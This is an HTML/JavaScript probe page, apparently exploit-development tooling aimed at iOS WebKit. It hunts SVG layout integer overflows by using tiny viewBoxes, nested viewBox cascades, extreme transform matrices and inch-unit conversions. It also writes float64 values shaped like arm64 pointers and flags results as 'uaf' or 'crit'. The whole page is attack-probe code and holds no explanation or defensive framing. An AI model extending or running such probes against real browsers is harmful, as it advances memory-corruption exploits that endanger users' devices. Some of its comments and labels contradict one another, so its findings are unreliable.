<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG v26 — viewBox Amplification + Matrix INT32 Overflow</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0a;color:#ccc;font-family:monospace;font-size:11px;padding:12px}
h1{color:#fff;font-size:13px;margin-bottom:3px}
h2{color:#555;font-size:9px;text-transform:uppercase;letter-spacing:.12em;margin-bottom:8px}
.suite{background:#111;border:1px solid #1e1e1e;border-radius:4px;padding:10px;margin-bottom:8px}
.result{padding:4px 8px;border-radius:2px;margin-bottom:2px;font-size:11px;word-break:break-all}
.pass{background:#081208;border-left:3px solid #0c0;color:#0c0}
.fail{background:#120808;border-left:3px solid #f00;color:#f44}
.warn{background:#121000;border-left:3px solid #aa0;color:#cc0}
.info{background:#0c0c0c;border-left:2px solid #2a2a2a;color:#666}
.star{background:#08081a;border-left:3px solid #66f;color:#99f}
.crit{background:#160a00;border-left:3px solid #f80;color:#fc8;font-weight:bold}
.uaf{background:#1a0000;border-left:4px solid #f00;color:#ff3333;font-weight:bold;font-size:12px;padding:6px 10px}
.hdr{color:#444;font-size:9px;text-transform:uppercase;letter-spacing:.08em;padding:2px 0 4px;border-bottom:1px solid #1a1a1a;margin-bottom:6px}
button{background:#0e0e0e;color:#0d0;border:1px solid #0d0;padding:4px 10px;font-family:monospace;font-size:10px;cursor:pointer;border-radius:2px;margin:0 3px 4px 0}
button:active{background:#0d0;color:#000}
#btn-all{border-color:#cc0;color:#cc0}
#btn-copy{border-color:#888;color:#888}
</style>
</head>
<body>
<h1>SVG v26 — viewBox Amplification + Matrix INT32 Overflow</h1>
<h2>iOS 26.5.2 · VBX / VBA / VBN / MXI / CTM / INA</h2>

<div class="suite">
<button id="btn-all" onclick="runAll()">▶ ALL</button>
<button onclick="go('VBX')">VBX</button>
<button onclick="go('VBA')">VBA</button>
<button onclick="go('VBN')">VBN</button>
<button onclick="go('MXI')">MXI</button>
<button onclick="go('CTM')">CTM</button>
<button onclick="go('INA')">INA</button>
<button id="btn-copy" onclick="copyAll()">⎘ Copy</button>
<button onclick="clearOut()">✕</button>
</div>
<div class="suite"><div id="out"></div></div>

<script>
var NS='http://www.w3.org/2000/svg';
var LU_MAX=33554432;  // LayoutUnit::max() ≈ 33.5M px
var INT32_MAX=2147483647;
var INT32_OVF=2147483648;  // 2^31 — where BCR saturated in v25

function log(m,c){
  var d=document.getElementById('out');
  var e=document.createElement('div');
  e.className='result '+(c||'info');
  e.textContent=m;
  d.appendChild(e);
}
function hdr(m){log(m,'hdr');}
function clearOut(){document.getElementById('out').innerHTML='';}
function copyAll(){
  var lines=[];
  document.querySelectorAll('#out .result').forEach(function(e){lines.push(e.textContent);});
  navigator.clipboard&&navigator.clipboard.writeText(lines.join('\n'));
}
function go(s){clearOut();window['run'+s]();}
function runAll(){
  clearOut();
  runVBX();
  setTimeout(function(){runVBA();},300);
  setTimeout(function(){runVBN();},600);
  setTimeout(function(){runMXI();},900);
  setTimeout(function(){runCTM();},1200);
  setTimeout(function(){runINA();},1500);
}

// float utils
var _fb=new ArrayBuffer(8);
var _fv=new Float32Array(_fb);
var _dv=new Float64Array(_fb);
var _uv=new Uint32Array(_fb);
function bitsF32(u){_uv[0]=u;return _fv[0];}
function f32b(f){_fv[0]=f;return _uv[0];}
function bitsF64(hi,lo){_uv[1]=hi;_uv[0]=lo;return _dv[0];}
function f64h(f){_dv[0]=f;return{hi:_uv[1],lo:_uv[0]};}
function f64hex(f){var h=f64h(f);return'0x'+h.hi.toString(16).padStart(8,'0')+'_'+h.lo.toString(16).padStart(8,'0');}

function classifyBCR(bcr,label){
  var x=bcr?bcr.x:null;
  if(x===null)return'fail';
  if(x<-LU_MAX)return'crit — NEGATIVE OVF: '+label+'='+x.toExponential(3);
  if(x>LU_MAX&&x<INT32_OVF)return'uaf — PAST LU_MAX! '+label+'='+x.toExponential(3);
  if(x>=INT32_OVF)return'crit — AT/PAST INT32_OVF: '+label+'='+x;
  return null;
}

function mkSVG(w,h,vb){
  var s=document.createElementNS(NS,'svg');
  s.setAttribute('width',w||100);s.setAttribute('height',h||100);
  if(vb)s.setAttribute('viewBox',vb);
  s.style.cssText='position:absolute;left:-9999px;top:-9999px';
  document.body.appendChild(s);
  return s;
}
function mkRect(svg,x,y,w,h){
  var r=document.createElementNS(NS,'rect');
  r.setAttribute('x',x||0);r.setAttribute('y',y||0);
  r.setAttribute('width',w||10);r.setAttribute('height',h||10);
  svg.appendChild(r);
  return r;
}

// ════════════════════════════════════════════════════════════════════════
// VBX — viewBox zoom: does BCR bypass LayoutUnit clamping?
// v25 showed: viewBox="0 0 0.000001 0.000001" on 100px SVG gives BCR.w=1e8
// LayoutUnit max ≈ 33,554,432 — we got 100,000,000 → PAST IT
// ════════════════════════════════════════════════════════════════════════
function runVBX(){
  hdr('VBX: viewBox amplification — does BCR bypass LayoutUnit max?');
  hdr('LU_MAX='+LU_MAX+' INT32_OVF='+INT32_OVF);

  // VBX[1]: sweep viewBox zoom levels, rect at fixed fractional position
  // Each test: how small can viewBox be before BCR blows past LU_MAX?
  var tests=[
    {vb:'0 0 100 100',   rectX:0,   note:'baseline (1px/unit)'},
    {vb:'0 0 10 10',     rectX:35000000, note:'10px/unit, x=35M units (LU territory)'},
    {vb:'0 0 1 1',       rectX:50000000, note:'100px/unit, x=50M units'},
    {vb:'0 0 0.1 0.1',   rectX:340000,  note:'1000px/unit, x=340K→340M px'},
    {vb:'0 0 0.01 0.01', rectX:34000,   note:'10000px/unit, x=34K→340M px'},
    {vb:'0 0 0.001 0.001', rectX:34000, note:'100K px/unit, x=34K→3.4B px [INT32 zone]'},
    {vb:'0 0 0.0001 0.0001', rectX:2200, note:'1M px/unit, x=2200→2.2B px [INT32 zone]'},
    {vb:'0 0 0.00001 0.00001', rectX:215, note:'10M px/unit, x=215→2.15B px [INT32 zone]'},
    {vb:'0 0 0.000001 0.000001', rectX:21, note:'100M px/unit, x=21→2.1B px [INT32 zone]'},
    {vb:'0 0 0.0000001 0.0000001', rectX:2, note:'1B px/unit, x=2→2B px'},
    {vb:'0 0 1e-9 1e-9',  rectX:2,  note:'10B px/unit, x=2→20B px [PAST INT32]'},
    {vb:'0 0 1e-10 1e-10', rectX:1, note:'100B px/unit, x=1→100B px'},
  ];

  for(var i=0;i<tests.length;i++){
    var t=tests[i];
    var svg=mkSVG(100,100,t.vb);
    var r=mkRect(svg,t.rectX,0,1,1);
    var bcr=null;
    try{bcr=r.getBoundingClientRect();}catch(e){log('VBX[1]: ['+t.note+'] BCR err: '+e.message,'fail');svg.remove();continue;}
    var x=bcr.x;
    var flag=null;
    if(x<-LU_MAX)flag='crit — NEGATIVE (neg overflow?)';
    else if(x>LU_MAX&&x<INT32_OVF-1)flag='uaf — PAST LU_MAX (float path, no LayoutUnit clamp!)';
    else if(x>=INT32_OVF-1&&x<=INT32_OVF+1)flag='crit — AT INT32_OVF boundary!';
    else if(x<-1e8)flag='crit — MASSIVE NEGATIVE!';
    log('VBX[1]: ['+t.note+']\n  → BCR.x='+x.toExponential(4)+' LU_MAX='+(x>LU_MAX?'EXCEEDED':'ok')+' INT32='+(Math.abs(x)>=INT32_OVF?'OVERFLOW':'ok'),
      flag||((x>LU_MAX)?'star — past LU_MAX':'info'));
    svg.remove();
  }

  // VBX[2]: fine binary search near INT32_OVF boundary with viewBox 1e-8
  hdr('VBX[2]: binary search near INT32 boundary (viewBox 1e-8)');
  // viewBox="0 0 1e-8 1e-8" on 100px SVG → 1 SVG unit = 10B screen px
  // INT32_MAX = 2147483647, INT32_OVF = 2147483648
  // To get screen x = 2147483648, need SVG x = 2147483648 / (100/1e-8) = 2147483648/1e10 = 0.0000002147...
  var vbSVG=mkSVG(100,100,'0 0 1e-8 1e-8');
  var xProbes=[
    0.0000001,   // 0.0000001 * 1e10 = 1M px
    0.0000334,   // 0.0000334 * 1e10 = 334M px
    0.000100,    // 1B px
    0.000200,    // 2B px (near INT32)
    0.000210,    // 2.1B px
    0.000214,    // 2.14B px
    0.000215,    // 2.15B px
    0.0002147,   // 2.147B px (very near INT32_MAX)
    0.00021474836,  // exactly INT32_MAX/1e10 = 0.0002147483647
    0.000215,    // just past INT32_MAX/1e10
    0.00025,     // 2.5B px (past INT32)
    0.001,       // 10B px (well past)
  ];
  for(var j=0;j<xProbes.length;j++){
    var xp=xProbes[j];
    var rp=mkRect(vbSVG,xp,0,1,1);
    var bcrp=null;
    try{bcrp=rp.getBoundingClientRect();}catch(e){log('VBX[2]: err: '+e.message,'fail');vbSVG.removeChild(rp);continue;}
    var expectedPx=(xp*(100/1e-8))-9999;  // subtract SVG's off-screen offset
    var actualX=bcrp.x;
    var delta=actualX-expectedPx;
    log('VBX[2]: svgX='+xp.toExponential(4)+' expectedPx='+expectedPx.toExponential(4)+' actualX='+actualX.toExponential(4)+' delta='+delta.toExponential(2),
      (actualX<0&&expectedPx>0?'crit — SIGNED INT OVERFLOW! expected +'+expectedPx.toExponential(3)+' got '+actualX:
       Math.abs(actualX)>=INT32_OVF?'crit — AT INT32 BOUNDARY':
       actualX>LU_MAX?'star — past LU_MAX, float path confirmed':'info'));
    vbSVG.removeChild(rp);
  }
  vbSVG.remove();
}

// ════════════════════════════════════════════════════════════════════════
// VBA — viewBox + TF write amplification
// Write x via TF (bypassing normal setAttribute parsing),
// then amplify via tiny viewBox → does it compound?
// ════════════════════════════════════════════════════════════════════════
function runVBA(){
  hdr('VBA: TF write + viewBox amplification combo');

  // VBA[1]: write large x via TF, inner SVG has tiny viewBox
  // Strategy: outer SVG normal, inner SVG with tiny viewBox
  // Place rect in inner SVG, modify its x via TF
  var outerSVG=mkSVG(500,500);
  var innerSVG=document.createElementNS(NS,'svg');
  innerSVG.setAttribute('width',100);innerSVG.setAttribute('height',100);
  innerSVG.setAttribute('viewBox','0 0 0.000001 0.000001');  // 1 SVG unit = 100M px
  outerSVG.appendChild(innerSVG);

  var r=mkRect(innerSVG,0.1,0,0.01,0.01);  // x=0.1 → 10M px (normal)
  var tf=r.x.baseVal;
  log('VBA[1]: inner SVG viewBox=0.000001, rect x=0.1 → expected screen x≈10M px','info');
  var bcr1=r.getBoundingClientRect();
  log('VBA[1]: baseline BCR.x='+bcr1.x.toExponential(4),(bcr1.x>LU_MAX?'star — PAST LU_MAX already':'info'));

  // Now remove rect, write larger x via TF, re-attach
  innerSVG.removeChild(r);
  tf.value=0.34;  // 0.34 × 100M = 34M (just past LU_MAX)
  innerSVG.appendChild(r);
  var bcr2=r.getBoundingClientRect();
  log('VBA[1]: TF x=0.34 → 34M expected, BCR.x='+bcr2.x.toExponential(4),
    (bcr2.x>LU_MAX?'uaf — PAST LU_MAX via TF+viewBox!':bcr2.x===LU_MAX||Math.abs(bcr2.x-LU_MAX)<10000?'warn — CLAMPED to LU_MAX':'info'));

  innerSVG.removeChild(r);
  tf.value=0.22;  // 0.22 × 100M = 22M (under LU_MAX)
  innerSVG.appendChild(r);
  var bcr3=r.getBoundingClientRect();
  log('VBA[1]: TF x=0.22 → 22M, BCR.x='+bcr3.x.toExponential(4),'info');

  // approach from below
  var steps=[0.30,0.33,0.335,0.3355,0.336,0.34,0.35,0.40,0.50,1.0,2.0,21.47484];
  hdr('VBA[2]: sweep TF values through viewBox amplification (viewBox 1e-6)');
  for(var k=0;k<steps.length;k++){
    var xv=steps[k];
    innerSVG.removeChild(r);
    var wb=false;
    try{tf.value=xv;wb=true;}catch(e){log('VBA[2]: x='+xv+' write err','fail');continue;}
    innerSVG.appendChild(r);
    var bcr=r.getBoundingClientRect();
    var bx=bcr.x;
    var expectedScreen=xv*1e8;  // 1 SVG unit = 100M px for viewBox 0.000001
    log('VBA[2]: svgX='+xv+' expectedScrPx='+expectedScreen.toExponential(3)+' BCR.x='+bx.toExponential(4),
      (bx<0&&expectedScreen>0?'uaf — NEGATIVE BCR! INT32 OVERFLOW via viewBox+TF!':
       bx>LU_MAX&&bx<INT32_OVF?'uaf — PAST LU_MAX, no clamp! float path!':
       bx>=INT32_OVF?'crit — AT INT32 BOUNDARY':
       'info'));
    innerSVG.removeChild(r);
  }

  outerSVG.remove();

  // VBA[3]: viewBox 1e-8 + TF write — can we reach INT32 overflow?
  hdr('VBA[3]: viewBox 1e-8 + TF write (targeting INT32 overflow)');
  var svg3=mkSVG(100,100);
  var inner3=document.createElementNS(NS,'svg');
  inner3.setAttribute('width',100);inner3.setAttribute('height',100);
  inner3.setAttribute('viewBox','0 0 1e-8 1e-8');  // 1 unit = 10B px
  svg3.appendChild(inner3);

  var r3=mkRect(inner3,0,0,0.000001,0.000001);
  var tf3=r3.x.baseVal;
  var probes3=[0.0001, 0.0002, 0.00021, 0.000214, 0.0002147, 0.00021475, 0.00025, 0.001];
  for(var p=0;p<probes3.length;p++){
    var xp3=probes3[p];
    inner3.removeChild(r3);
    try{tf3.value=xp3;}catch(e){log('VBA[3]: x='+xp3+' err','fail');continue;}
    inner3.appendChild(r3);
    var bcrp3=r3.getBoundingClientRect();
    var exp3=xp3*1e10;
    log('VBA[3]: svgX='+xp3.toExponential(4)+' exp='+exp3.toExponential(3)+' BCR.x='+bcrp3.x.toExponential(4),
      (bcrp3.x<0&&exp3>0?'uaf — SIGNED INT OVERFLOW via viewBox+TF!':
       bcrp3.x>LU_MAX?'star — past LU_MAX':'info'));
    inner3.removeChild(r3);
  }
  svg3.remove();
}

// ════════════════════════════════════════════════════════════════════════
// VBN — nested viewBox cascade amplification
// Each nested SVG multiplies the coordinate space
// ════════════════════════════════════════════════════════════════════════
function runVBN(){
  hdr('VBN: nested viewBox cascade amplification');

  // VBN[1]: 2 levels of tiny viewBox
  // Outer SVG: normal 100px
  // Middle SVG: viewBox="0 0 0.001 0.001" (1000px/unit), position x=0.001 → 1px
  // Inner SVG: viewBox="0 0 0.001 0.001" again, width/height in middle-SVG units
  // Net: 1 inner SVG unit = 1000 middle units × 1000 screen units = 1M px
  // Actually nested SVG viewBox works differently — each SVG establishes its own viewport

  hdr('VBN[1]: 2-level cascade');
  var outerSVG=mkSVG(1000,1000);
  var mid=document.createElementNS(NS,'svg');
  mid.setAttribute('x',0);mid.setAttribute('y',0);
  mid.setAttribute('width',100);mid.setAttribute('height',100);
  mid.setAttribute('viewBox','0 0 0.001 0.001');  // 1 mid unit = 100000 px
  outerSVG.appendChild(mid);

  var inner=document.createElementNS(NS,'svg');
  inner.setAttribute('x',0);inner.setAttribute('y',0);
  inner.setAttribute('width',0.0001);inner.setAttribute('height',0.0001);  // in mid coords
  inner.setAttribute('viewBox','0 0 0.0001 0.0001');  // 1 inner unit = 1 mid unit * (0.0001/0.0001) = 1 mid unit
  mid.appendChild(inner);

  var rect=mkRect(inner,0.0001,0,0.00001,0.00001);
  var bcr=rect.getBoundingClientRect();
  log('VBN[1]: 2-level viewBox cascade, BCR.x='+bcr.x.toExponential(4),
    (bcr.x>LU_MAX?'star — past LU_MAX via cascade!':'info'));

  // VBN[2]: explicit cascade with known scale factors
  hdr('VBN[2]: explicit 3-level cascade');
  // Level 1: SVG 1000×1000 on screen
  // Level 2: SVG viewBox="0 0 0.001 0.001" → 1 L2 unit = 1M px
  // Level 3: SVG viewBox="0 0 0.001 0.001" on L2 → 1 L3 unit = 1e9 px = 1B px
  var L1=mkSVG(1000,1000);
  var L2=document.createElementNS(NS,'svg');
  L2.setAttribute('x',0);L2.setAttribute('y',0);
  L2.setAttribute('width',1000);L2.setAttribute('height',1000);
  L2.setAttribute('viewBox','0 0 0.001 0.001');
  L1.appendChild(L2);
  var L3=document.createElementNS(NS,'svg');
  L3.setAttribute('x',0);L3.setAttribute('y',0);
  L3.setAttribute('width',0.001);L3.setAttribute('height',0.001);
  L3.setAttribute('viewBox','0 0 0.001 0.001');
  L2.appendChild(L3);
  var r3=mkRect(L3,0.0002,0,0.000001,0.000001);
  var bcr3=r3.getBoundingClientRect();
  // Expected: 0.0002 L3 units × (1000/0.001 L2px/L3unit) × (1000/0.001 px/L2unit) = 0.0002 * 1e6 * 1e6 = 2e8
  log('VBN[2]: 3-level cascade, expected≈2e8 px, BCR.x='+bcr3.x.toExponential(4),
    (bcr3.x<0?'uaf — NEGATIVE FROM CASCADE OVERFLOW!':
     bcr3.x>LU_MAX?'uaf — PAST LU_MAX VIA 3-LEVEL CASCADE!':'info'));
  var r3tf=r3.x.baseVal;
  L3.removeChild(r3);
  r3tf.value=0.002;  // 10× larger → 2e9 px expected (past INT32)
  L3.appendChild(r3);
  var bcr3b=r3.getBoundingClientRect();
  log('VBN[2]: TF x=0.002 → exp 2e9 px, BCR.x='+bcr3b.x.toExponential(4),
    (bcr3b.x<0&&bcr3b.x>-3e9?'uaf — SIGNED INT OVERFLOW FROM 3-LEVEL CASCADE+TF!':
     bcr3b.x>=INT32_OVF?'crit — AT INT32 BOUNDARY from cascade+TF':
     bcr3b.x>LU_MAX?'star — past LU_MAX from cascade+TF':'info'));
  L1.remove();
  outerSVG.remove();
}

// ════════════════════════════════════════════════════════════════════════
// MXI — Matrix INT32 overflow investigation
// v25 showed BCR.x=2147483648 for all mx.e > ~2e9
// Is this a real signed int overflow or saturation?
// ════════════════════════════════════════════════════════════════════════
function runMXI(){
  hdr('MXI: Matrix translate INT32 overflow investigation');
  var svg=mkSVG(200,200);
  document.body.appendChild(svg);  // need to be in viewport for accurate BCR

  var r=mkRect(svg,0,0,10,10);
  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
  var mx=r.transform.baseVal.getItem(0).matrix;
  svg.removeChild(r);

  // MXI[1]: binary search the exact saturation point
  hdr('MXI[1]: binary search — where does BCR.x saturate to 2^31?');
  var mxProbes=[
    1e6,  5e6, 1e7, 5e7, 1e8, 5e8,
    1e9, 1.5e9, 2e9, 2.1e9, 2.14e9,
    2.147e9, 2.1474e9, 2.14748e9,
    INT32_MAX,   // 2147483647
    INT32_OVF,   // 2147483648
    2.148e9, 2.15e9, 2.2e9, 3e9, 1e10, 1e15
  ];

  for(var i=0;i<mxProbes.length;i++){
    var mxe=mxProbes[i];
    try{mx.e=mxe;}catch(e){log('MXI[1]: e='+mxe+' write err','fail');continue;}
    svg.appendChild(r);
    var bcr=null;
    try{bcr=r.getBoundingClientRect();}catch(e){}
    var bx=bcr?bcr.x:null;
    svg.removeChild(r);
    log('MXI[1]: mx.e='+mxe.toExponential(4)+' BCR.x='+bx,
      (bx<0?'uaf — NEGATIVE BCR FROM INT32 OVERFLOW! e='+mxe:
       bx===INT32_OVF?'crit — AT 2^31 (saturation point)':
       bx>LU_MAX&&bx<INT32_OVF?'star — BETWEEN LU_MAX AND 2^31 ('+bx+')':'info'));
  }

  // MXI[2]: negative direction — mirror test
  hdr('MXI[2]: negative translate saturation');
  var negProbes=[-1e7,-1e8,-1e9,-2e9,-2.147e9,-2.148e9,-1e10,-1e15];
  for(var j=0;j<negProbes.length;j++){
    var mxen=negProbes[j];
    try{mx.e=mxen;}catch(e){continue;}
    svg.appendChild(r);
    var bcrn=null;try{bcrn=r.getBoundingClientRect();}catch(e){}
    svg.removeChild(r);
    log('MXI[2]: mx.e='+mxen.toExponential(3)+' BCR.x='+(bcrn?bcrn.x:null),
      (bcrn&&bcrn.x>0&&mxen<0?'uaf — POSITIVE BCR FROM NEGATIVE OVERFLOW!':
       bcrn&&bcrn.x<-LU_MAX?'crit — past -LU_MAX: '+bcrn.x:'info'));
  }

  // MXI[3]: Y translate overflow — does it affect X or vice versa?
  hdr('MXI[3]: Y translate overflow → does it spill into X?');
  mx.e=0;
  var yProbes=[1e9,2e9,2.147e9,2.148e9,1e10,1e15];
  for(var k=0;k<yProbes.length;k++){
    mx.f=yProbes[k];
    svg.appendChild(r);
    var bcry=null;try{bcry=r.getBoundingClientRect();}catch(e){}
    svg.removeChild(r);
    log('MXI[3]: mx.f='+yProbes[k].toExponential(3)+' BCR.x='+(bcry?bcry.x:null)+' BCR.y='+(bcry?bcry.y:null),
      (bcry&&bcry.x!==0&&yProbes[k]>1e9?'crit — Y OVERFLOW CORRUPTED X! x='+bcry.x:'info'));
  }

  // MXI[4]: scale overflow — mx.a (scale X) extreme values
  hdr('MXI[4]: scale factor overflow (mx.a)');
  mx.e=0;mx.f=0;
  var scaleProbes=[1,1e3,1e6,1e8,1e10,1e15,1e30];
  for(var s=0;s<scaleProbes.length;s++){
    try{mx.a=scaleProbes[s];}catch(e){continue;}
    svg.appendChild(r);
    // rect is at x=0,width=10, so BCR.width = 10 * scale
    var bcrs=null;try{bcrs=r.getBoundingClientRect();}catch(e){}
    svg.removeChild(r);
    log('MXI[4]: mx.a='+scaleProbes[s].toExponential(2)+' BCR.w='+(bcrs?bcrs.width.toExponential(4):null),
      (bcrs&&bcrs.width<0?'uaf — NEGATIVE WIDTH FROM SCALE OVERFLOW!':
       bcrs&&bcrs.width>LU_MAX?'star — WIDTH past LU_MAX: '+bcrs.width.toExponential(3):'info'));
  }
  mx.a=1;
  svg.remove();
}

// ════════════════════════════════════════════════════════════════════════
// CTM — getScreenCTM raw float64 investigation
// BCR clamps at INT32, but getScreenCTM returns raw float64
// Can we use this discrepancy?
// ════════════════════════════════════════════════════════════════════════
function runCTM(){
  hdr('CTM: getScreenCTM vs getBCR discrepancy — raw float64 path');
  var svg=mkSVG(100,100);

  // CTM[1]: write known pattern to matrix, read via getScreenCTM
  var r=mkRect(svg,0,0,10,10);
  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
  var mx=r.transform.baseVal.getItem(0).matrix;
  svg.removeChild(r);

  hdr('CTM[1]: verify getScreenCTM passes exact float64');
  var ctmTests=[
    {e:1234.5678, name:'normal'},
    {e:1e15, name:'1e15'},
    {e:1e30, name:'1e30'},
    {e:bitsF64(0x00000001,0x80000000), name:'arm64_ptr_shape'},
    {e:bitsF64(0x00000001,0x00106000), name:'arm64_ptr2'},
    {e:1.7976931348623157e308, name:'float64_max'},
    {e:5e-324, name:'float64_min'},
    {e:2.225073858507201e-308, name:'float64_denorm_min'},
  ];
  for(var i=0;i<ctmTests.length;i++){
    var t=ctmTests[i];
    try{mx.e=t.e;}catch(e){log('CTM[1]: ['+t.name+'] write err: '+e.message,'fail');continue;}
    svg.appendChild(r);
    var ctm=null;try{ctm=r.getScreenCTM();}catch(e){log('CTM[1]: getScreenCTM err','fail');}
    var bcr=null;try{bcr=r.getBoundingClientRect();}catch(e){}
    svg.removeChild(r);
    var ctmE=ctm?ctm.e:null;
    var bcrX=bcr?bcr.x:null;
    var exact=ctmE===t.e;
    log('CTM[1]: ['+t.name+'='+t.e.toExponential(4)+']\n  CTM.e='+ctmE+' exact='+exact+' BCR.x='+bcrX,
      (exact&&Math.abs(t.e)>1e10?'star — CTM returns EXACT float64 even for extreme values':
       !exact&&ctmE!==null?'warn — CTM rounded: got '+ctmE:
       'info'));
    if(ctm)log('CTM[1]:   CTM.e bits='+f64hex(ctmE)+' written='+f64hex(t.e),'info');
  }

  // CTM[2]: getTransformToElement between two extreme-coordinate elements
  hdr('CTM[2]: getTransformToElement between extreme-coord elements');
  var r2=mkRect(svg,0,0,10,10);
  r2.setAttribute('transform','matrix(1 0 0 1 0 0)');
  var mx2=r2.transform.baseVal.getItem(0).matrix;
  svg.appendChild(r2);

  try{
    mx.e=1e15;mx2.e=-1e15;  // two elements at opposite extremes
    svg.appendChild(r);
    var xform=null;
    try{xform=r.getTransformToElement(r2);}catch(e){log('CTM[2]: getTransformToElement err: '+e.message,'warn');}
    if(xform){
      log('CTM[2]: transform between +1e15 and -1e15: e='+xform.e,'info');
      log('CTM[2]:   bits='+f64hex(xform.e),
        (xform.e===0?'info — expected 2e15 translation':
         xform.e===2e15?'star — 2e15 exact': 'star — e='+xform.e.toExponential(4)));
    }
    svg.removeChild(r);
  }catch(e){log('CTM[2]: exception: '+e.message,'warn');}

  // CTM[3]: getScreenCTM after extreme viewBox + normal transform
  hdr('CTM[3]: getScreenCTM with viewBox amplification');
  var svg2=mkSVG(100,100,'0 0 0.000001 0.000001');  // viewBox amplification
  var r3=mkRect(svg2,0,0,0.00001,0.00001);
  r3.setAttribute('transform','matrix(1 0 0 1 0.1 0)');  // translate by 0.1 SVG units = 10M px
  var ctm3=null;
  try{ctm3=r3.getScreenCTM();}catch(e){log('CTM[3]: err: '+e.message,'warn');}
  if(ctm3){
    log('CTM[3]: viewBox 1e-6 + translate 0.1 SVG unit → CTM.e='+ctm3.e,
      (ctm3.e>LU_MAX?'uaf — CTM.e PAST LU_MAX! float path!':
       'info'));
    log('CTM[3]:   CTM.e bits='+f64hex(ctm3.e),'info');
    log('CTM[3]:   BCR.x='+(r3.getBoundingClientRect().x).toExponential(4),'info');
  }
  svg2.remove();
  svg.remove();
}

// ════════════════════════════════════════════════════════════════════════
// INA — inch amplification via newValueSpecifiedUnits
// v25 STR[3]: unit=8 (inches) gives 9.6e31 px for 1e30 input
// Does this value flow through the rendering pipeline?
// ════════════════════════════════════════════════════════════════════════
function runINA(){
  hdr('INA: inch unit amplification (1in = 96px)');
  var svg=mkSVG(200,200);
  document.body.appendChild(svg);

  // INA[1]: write in inches, re-attach, check BCR
  hdr('INA[1]: newValueSpecifiedUnits(8=IN, value) → re-attach → BCR');
  var inTests=[
    {val:1e6,  note:'1M in = 96M px > LU_MAX'},
    {val:2.24e7, note:'22.4M in ≈ 2.147B px = INT32_MAX/96'},
    {val:2.24e7+1e5, note:'just past INT32_MAX/96'},
    {val:1e8, note:'100M in = 9.6B px >> INT32'},
    {val:1e10, note:'10B in = 960B px'},
    {val:1e30, note:'1e30 in = 9.6e31 px'},
  ];

  for(var i=0;i<inTests.length;i++){
    var t=inTests[i];
    var r=mkRect(svg,0,0,10,10);
    var tf=r.x.baseVal;
    svg.removeChild(r);
    try{
      tf.newValueSpecifiedUnits(8,t.val);  // unit 8 = IN
    }catch(e){log('INA[1]: ['+t.note+'] write err: '+e.message,'fail');continue;}
    svg.appendChild(r);
    var bcr=null;try{bcr=r.getBoundingClientRect();}catch(e){}
    var bx=bcr?bcr.x:null;
    var expectedPx=t.val*96;
    log('INA[1]: ['+t.note+']\n  written='+t.val+'in expected_px='+expectedPx.toExponential(3)+' BCR.x='+bx,
      (bx!==null&&bx<0&&expectedPx>0?'uaf — SIGNED INT OVERFLOW FROM INCH AMPLIFICATION!':
       bx!==null&&bx>LU_MAX&&bx<INT32_OVF?'uaf — PAST LU_MAX via inch unit!':
       bx!==null&&Math.abs(bx)>=INT32_OVF?'crit — AT INT32 BOUNDARY':
       bx!==null&&bx>0&&bx<=LU_MAX?'warn — clamped to LU_MAX ≈ '+LU_MAX:'info'));
    svg.removeChild(r);
  }

  // INA[2]: inch unit + viewBox combo — double amplification
  hdr('INA[2]: inch write + viewBox amplification combo');
  var inner=document.createElementNS(NS,'svg');
  inner.setAttribute('width',100);inner.setAttribute('height',100);
  inner.setAttribute('viewBox','0 0 0.001 0.001');  // 1 SVG unit = 100K px
  svg.appendChild(inner);

  var r2=mkRect(inner,0,0,0.001,0.001);
  var tf2=r2.x.baseVal;
  inner.removeChild(r2);
  // write 1 inch = 96px on a viewBox scale of 100K:1
  // so 1in in this SVG's coordinate system = 96 * 100000 = 9.6M px total?
  // Actually: SVGLength in inches is converted to user units (SVG px) first
  // Then viewBox scales user units to screen px
  // 1 SVG unit = 100K screen px, 1in = 96 SVG user units
  // So 1in → 96 SVG units → 96 × 100K = 9.6M screen px
  var inViewTests=[100,350,1000];  // in SVG user units... wait need to check
  // Actually newValueSpecifiedUnits(8, v) sets the stored value in inches
  // .value returns converted user units (SVG px, where 1in=96px)
  // So tf2.value = v * 96 in SVG user units
  // viewBox makes 1 SVG user unit = 100K screen px
  // So screen px = v * 96 * 100K = v * 9.6M
  for(var j=0;j<inViewTests.length;j++){
    var iv=inViewTests[j];
    try{tf2.newValueSpecifiedUnits(8,iv);}catch(e){log('INA[2]: err','fail');continue;}
    inner.appendChild(r2);
    var bcr2=null;try{bcr2=r2.getBoundingClientRect();}catch(e){}
    inner.removeChild(r2);
    var svgPx=iv*96;
    var screenPx=svgPx*(100/0.001);
    log('INA[2]: '+iv+'in → '+svgPx+' SVG px → '+screenPx.toExponential(3)+' screen px, BCR.x='+(bcr2?bcr2.x.toExponential(4):null),
      (bcr2&&bcr2.x<0&&screenPx>0?'uaf — INT32 OVERFLOW via INCH+VIEWBOX!':
       bcr2&&bcr2.x>LU_MAX?'star — PAST LU_MAX via inch+viewBox':'info'));
  }
  svg.remove();
}
</script>
